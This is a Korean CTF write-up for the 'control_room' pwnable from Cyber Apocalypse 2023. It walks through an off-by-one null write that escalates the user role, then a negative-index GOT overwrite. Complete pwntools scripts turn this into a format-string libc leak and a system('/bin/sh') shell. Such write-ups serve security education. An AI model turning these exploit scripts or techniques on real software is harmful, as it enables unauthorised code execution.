---
layout: post
title: control_room
parent: Cyber Apocalypse 2023 - The Cursed Mission
tags: [pwnable]
grand_parent: CTF Write-ups
nav_order: 1
lang: ko
lang-ref: Cyber Apocalypse 2023 - The Cursed Mission
---

# control_room

## Binary 분석

![image](/assets/images/Cyber Apocalypse 2023 - The Cursed Mission/control_room/control_room.png)

먼저, 주어진 binary를 checksec으로 확인 결과, 위와 같은 보호기법이 걸려있는 것을 확인하였다.

![image](/assets/images/Cyber Apocalypse 2023 - The Cursed Mission/control_room/control_room1.png)

원할한 문제 풀이를 위해, 주어진 libc.so.6를 pwninit을 사용하여 libc link를 진행하였다.

그대로 한번 실행해 보도록 하자,

![image](/assets/images/Cyber Apocalypse 2023 - The Cursed Mission/control_room/control_room2.png)

현재 권한은 `Crew`라고 출력되며, 기능들을 사용하기 위해서는 다른 권한이 필요한 것으로 나온다. 아마 첫번째 익스 관권은 해당 권한을 바꾸는 것으로 부터 시작할 것으로 예상된다.

이제, IDA를 사용해서 주어진 바이너리를 분석해보자.

![image](/assets/images/Cyber Apocalypse 2023 - The Cursed Mission/control_room/control_room3.png)

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s[4]; // [rsp+14h] [rbp-Ch] BYREF
  unsigned __int64 v5; // [rsp+18h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  setup(argc, argv, envp);
  *(_DWORD *)s = 0;                             // s = {0, }
  user_register();
  printf("\nAre you sure about your username choice? (y/n)");
  printf("\n> ");
  fgets(s, 4, stdin);
  s[strcspn(s, "\n")] = 0;
  if ( !strcmp(s, "y") )
    log_message(0LL, "User registered successfully.\n");
  else
    user_edit();
  menu();
}
```

```c
//in user_register
  printf("Enter a username: ");
  read_input(src, 0x100uLL);
  strncpy(curr_user, src, 0x100uLL);
  *((_QWORD *)curr_user + 33) = strlen(curr_user) + 1;
```

`main`에서 실행되는 `user_register`함수에서, 사용자를 입력받고, 뒷부분에 입력한 길이 + 1 를 저장한다. 이후 `main`에서 입력한 사용자를 수정할 수 있게된다. 또한 해당부분에서는, Overflow가 불가능하다. 이후 실행시킬 수 있는 `user_edit`함수를 살펴보자.

```c
void user_edit()
{
  int n; // [rsp+4h] [rbp-Ch]
  void *s; // [rsp+8h] [rbp-8h]

  puts("<===[ Edit Username ]===>\n");
  printf("New username size: ");
  n = read_num();
  getchar();
  if ( *((_QWORD *)curr_user + 33) >= (unsigned __int64)n )
  {
    s = malloc(n + 1);
    if ( !s )
    {
      log_message(3LL, "Please replace the memory catridge.");
      exit(-1);
    }
    memset(s, 0, n + 1);
    printf("\nEnter your new username: ");
    fgets((char *)s, n, stdin);
    *((_BYTE *)s + strcspn((const char *)s, "\n")) = 0;
    strncpy(curr_user, (const char *)s, n + 1);
    log_message(0LL, "User updated successfully!\n");
    free(s);
  }
  else
  {
    log_message(3LL, "Can't be larger than the current username.\n");
  }
}
```

해당 부분에서 주의 깊게 볼 부분은, `curr_user`, 그리고 입력한 `n`이다.

해당 부분에서 다시 입력받은 사이즈인 `n`에서 +1한값을 `memset`을 통해 0으로 setting한다.

따라서 해당 부분을 통해 무언갈 해볼 수 있을 것으로 보인다.

```c
void __noreturn menu()
{
  unsigned int option; // [rsp+Ch] [rbp-4h]

  while ( 1 )
  {
    print_banner();
    print_current_role();
    option = read_option(5u);
    printf("selection: %d\n", option);
    switch ( option )
    {
      case 1u:
        configure_engine();
        break;
      case 2u:
        check_engines();
        break;
      case 3u:
        change_route();
        break;
      case 4u:
        view_route();
        break;
      case 5u:
        change_role();
        break;
      default:
        log_message(3u, "Invalid option\n");
        exit(-1);
    }
  }
}
```

`menu`함수를 살펴보자. 

실행 했을 때 보았던, 권한을 출력하는 함수가 보인다. 해당 함수를 살펴보자.`

```c
int print_current_role()
{
  int v0; // eax

  v0 = *((_DWORD *)curr_user + 64);
  if ( v0 == 2 )
    return log_message(1u, "Current Role: Crew\n");
  if ( v0 > 2 )
    goto LABEL_9;
  if ( !v0 )
    return log_message(1u, "Current Role: Captain\n");
  if ( v0 != 1 )
  {
LABEL_9:
    log_message(3u, "How did you get here?!\n");
    exit(1337);
  }
  return log_message(1u, "Current Role: Technician\n");
}
```

해당 함수에서, v0가 role을 구분하는 주요 변수로 확인되며, `int`형의 `(curr_user + 64)`만큼의 주소에 해당 값이 저장 됨을 알 수 있다. 또한,, 해당 값이 0이라면, `Captain`권한임을 확인할 수 있었다.

이를 통해, 우리는 `user_edit`함수를 통해, 해당값을 0으로 세팅할 수 있을 것임을 확인 할 수 있다.

```python
from pwn import *

def slog(k, v): return success(f" : ".join([k, hex(v)]))

p = process('./control_room_patched')
e = ELF('./control_room_patched')

context.log_level='debug'

payload = b'A' * 0x100
p.sendlineafter(b'Enter a username: ', payload)
p.sendlineafter(b'size: ', b'256')
payload = b'A'*0x9F
p.sendlineafter(b'username: ', payload)

p.interactive()
```

위 코드를 통해, 확인한 결과는 아래와 같다.

![image](/assets/images/Cyber Apocalypse 2023 - The Cursed Mission/control_room/control_room4.png)

성공적으로 `Captain`권한을 가져온 것을 확인할 수 있다.

### Menu 분석

```c
unsigned __int64 configure_engine()
{
  _QWORD *v0; // rcx
  __int64 v1; // rdx
  int num; // [rsp+Ch] [rbp-24h]
  __int64 v4; // [rsp+10h] [rbp-20h] BYREF
  __int64 v5; // [rsp+18h] [rbp-18h] BYREF
  char s[2]; // [rsp+25h] [rbp-Bh] BYREF
  char v7; // [rsp+27h] [rbp-9h]
  unsigned __int64 v8; // [rsp+28h] [rbp-8h]

  v8 = __readfsqword(0x28u);
  *(_WORD *)s = 0;
  v7 = 0;
  if ( *((_DWORD *)curr_user + 64) == 1 )
  {
    printf("\nEngine number [0-%d]: ", 3LL);
    num = read_num();
    if ( num <= 3 )
    {
      printf("Engine [%d]: \n", (unsigned int)num);
      printf("\tThrust: ");
      __isoc99_scanf("%ld", &v4);
      printf("\tMixture ratio: ");
      __isoc99_scanf("%ld", &v5);
    }
    getchar();
    printf("\nDo you want to save the configuration? (y/n) ");
    printf("\n> ");
    fgets(s, 3, stdin);
    s[strcspn(s, "\n")] = 0;
    if ( !strcmp(s, "y") )
    {
      v0 = (_QWORD *)((char *)&engines + 16 * num);
      v1 = v5;
      *v0 = v4;
      v0[1] = v1;
      log_message(0, "Engine configuration updated successfully!\n");
    }
    else
    {
      log_message(1u, "Engine configuration cancelled.\n");
    }
  }
  else
  {
    log_message(3u, "Only technicians are allowed to configure the engines");
  }
  return __readfsqword(0x28u) ^ v8;
}
```

먼저, `configure_engine`함수를 살펴보자.

해당 함수에서, 입력받은 `num`값을 통해, 전역변수 `engines`에서 `16 * num`만큼 떨어진 값에다가, 다시 입력한 값을 저장하는 것으로 분석되는데, 여기서 중요하게 여겨볼 것은, `num`이 3이하의 값임을 점검하는 과정에서, `음수를 검사하지 않는 다는 점`이다. `engines`는 전역변수로 `bss`영역에 존재하는데, 해당 값에서 음수 값을 적절히 준다면, `.GOT.PLT`영역의 값을 적절히 바꾸어 쓸 수 있게 된다. `(Partial RELRO)`

이 아이디어를 가지고 `egines`와 `PLT` 영역을 살펴보자.

![image](/assets/images/Cyber Apocalypse 2023 - The Cursed Mission/control_room/control_room5.png)

에상대로, `engines` 변수는 `bss section`에 존재한다. `(ADDR:0x405120)``

![image](/assets/images/Cyber Apocalypse 2023 - The Cursed Mission/control_room/control_room6.png)

IDA에서, `Read / Write 권한`이 있는 `_got_plt`영역을 찾았다. 해당 부분은 `engines`부분보다 앞에 존재함으로, 음수 값을 통해 적절히 `overwrite`할수 있을 것으로 보이는데, offset을 따로 계산하는 과정이 있었음으로, 위의 주소에서 끝자리가 0인 함수들만 `overwrite`할 수 있게된다.

적절히 계산하여, `libc leak`을 진행해보도록 하자.

## libc leak

먼저, 프로그램이 시작하면 실행되는, `user_register`함수 내부에서, 사용자가 입력한 값이 그대로 인자로 들어가는 `strlen`함수에 주목했고, `menu` 함수에서 `default` 내부에서 실행되는 `exit` 함수에 주목하였다.

또한 `printf plt`가 존재하기에 `strlen`함수를 `printf` 함수로 바꾸어, `formmat string bug`를 통해 libc leak을 진행하면 될 것으로 생각하였다. 그리고 `user_register`에서 `strlen`이 실행되기 때문에, 해당 함수를 실행하기 위해선, `exit`함수를 `user_register`함수로 변경하면 될 것으로 보여 아래와 같은 익스 코드를 작성했다.

```python
from pwn import *

def slog(k, v): return success(f" : ".join([k, hex(v)]))

p = process('./control_room_patched')
e = ELF('./control_room_patched')
libc = ELF('./libc.so.6')

def write(n1,n2,off):
    sleep(0.1)
    p.sendline(b"1")
    p.sendlineafter(b'number [0-3]: ',str(off).encode())
    p.sendlineafter(b'Thrust: ',str(n1).encode())
    p.sendlineafter(b'atio: ',str(n2).encode())
    p.sendlineafter(b'(y/n) \n',b"y")

context.log_level="debug"

payload = b'A' * 0x100
p.sendlineafter(b'Enter a username: ', payload)
p.sendlineafter(b'size: ', b'256')
payload = b'A'*0x9F
p.sendlineafter(b'username: ', payload)

main = e.symbols['main']
strlen_plt = 0x000000000405040

engines = e.symbols['engines']
printf_plt = e.plt['printf']
slog("engines", engines)
slog("main", main)
slog("printf_plt", printf_plt)
slog("strlen_plt", strlen_plt)
strlen_offset = -(engines - strlen_plt) // 0x10
 
p.sendline(b"5")
p.sendlineafter(b'role: ',b"1") #change role to Technician

write(printf_plt,"-", strlen_offset)# strlen -> printf
write(e.symbols['user_register'],"-",-7)#exit -> user_register

p.interactive()
```

![image](/assets/images/Cyber Apocalypse 2023 - The Cursed Mission/control_room/control_room7.png)

성공적으로 `overwrite`가 완료되어, `FSB`가 먹히는 것을 확인할 수 있다.

```python
#libc_leak.py
from pwn import *

def slog(k, v): return success(f" : ".join([k, hex(v)]))

p = process('./control_room_patched')
e = ELF('./control_room_patched')
libc = ELF('./libc.so.6')

def write(n1,n2,off):
    sleep(0.1)
    p.sendline(b"1")
    p.sendlineafter(b'number [0-3]: ',str(off).encode())
    p.sendlineafter(b'Thrust: ',str(n1).encode())
    p.sendlineafter(b'atio: ',str(n2).encode())
    p.sendlineafter(b'(y/n) \n',b"y")

context.log_level="debug"

payload = b'A' * 0x100
p.sendlineafter(b'Enter a username: ', payload)
p.sendlineafter(b'size: ', b'256')
payload = b'A'*0x9F
p.sendlineafter(b'username: ', payload)

main = e.symbols['main']
strlen_plt = 0x000000000405040

engines = e.symbols['engines']
printf_plt = e.plt['printf']
slog("engines", engines)
slog("main", main)
slog("printf_plt", printf_plt)
slog("strlen_plt", strlen_plt)
strlen_offset = -(engines - strlen_plt) // 0x10
 
p.sendline(b"5")
p.sendlineafter(b'role: ',b"1")

write(printf_plt,"-", strlen_offset)# strlen -> printf
write(e.symbols['user_register'],"-",-7)#exit -> user_register

p.sendline(b'q')
payload = f'%{71}$p'
p.sendlineafter(b'username: ', payload.encode())

p.recvuntil(b"0x")
ret_addr = int("0x"+p.recvn(12).decode(), 16)
slog("leak", ret_addr)  
lb = ret_addr - (libc.symbols['__libc_start_main']+128)
slog("lb", lb)

p.interactive()
```

나는, 71만큼 떨어진 곳의 `ret_addr`을 통해, libc_leak을 진행하였다.

![image](/assets/images/Cyber Apocalypse 2023 - The Cursed Mission/control_room/control_room8.png)

system함수의 주소를 구하여, 이제 익스코드를 작성해보도록 하자.

## exploit

```python
from pwn import *

def slog(k, v): return success(f" : ".join([k, hex(v)]))

p = process('./control_room_patched')
#p = remote('165.232.98.59', 32169)
e = ELF('./control_room_patched')
libc = ELF('./libc.so.6')

def write(n1,n2,off):
    sleep(0.1)
    p.sendline(b"1")
    p.sendlineafter(b'number [0-3]: ',str(off).encode())
    p.sendlineafter(b'Thrust: ',str(n1).encode())
    p.sendlineafter(b'atio: ',str(n2).encode())
    p.sendlineafter(b'(y/n) \n',b"y")

#context.log_level="debug"

payload = b'A' * 0x100
p.sendlineafter(b'Enter a username: ', payload)
p.sendlineafter(b'size: ', b'256')
payload = b'A'*0x9F
p.sendlineafter(b'username: ', payload)

main = e.symbols['main']
strlen_plt = 0x000000000405040

engines = e.symbols['engines']
printf_plt = e.plt['printf']
slog("engines", engines)
slog("main", main)
slog("printf_plt", printf_plt)
slog("strlen_plt", strlen_plt)
strlen_offset = -(engines - strlen_plt) // 0x10
 
p.sendline(b"5")
p.sendlineafter(b'role: ',b"1")

write(printf_plt,"-",-14)# strlen -> printf
write(e.symbols['user_register'],"-",-7)#exit -> user_register

p.sendline(b'q')
payload = f'%{71}$p'
p.sendlineafter(b'username: ', payload.encode())

p.recvuntil(b"0x")
ret_addr = int("0x"+p.recvn(12).decode(), 16)
slog("leak", ret_addr)  
lb = ret_addr - (libc.symbols['__libc_start_main']+128)
slog("lb", lb)

system = lb + libc.symbols['system']
slog("system", system)

write(system,"-",-14) # strlen -> system
p.sendline(b'q')
p.sendlineafter(b'username: ', b'/bin/sh')
p.interactive()
```

exploit 코드는, 똑같이 strlen함수를 system함수로 바꿔준 후, 입력값을 /bin/sh로 주어, 쉘을 따도록 하였다.

![image](/assets/images/Cyber Apocalypse 2023 - The Cursed Mission/control_room/control_room9.png)

성공이다.